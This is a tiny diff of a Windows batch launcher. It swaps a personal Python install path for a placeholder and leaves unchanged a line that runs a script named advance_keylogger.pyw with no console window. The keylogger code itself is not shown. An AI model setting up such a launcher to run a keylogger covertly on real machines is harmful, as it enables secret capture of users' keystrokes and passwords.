@@ -1,4 +1,4 @@
 @ ECHO OFF
 
- C:\Users\Sonu Kumar\AppData\Local\Programs\Python\Python311
+ "Python Installed location"
  %CD%\advance_keylogger.pyw %*
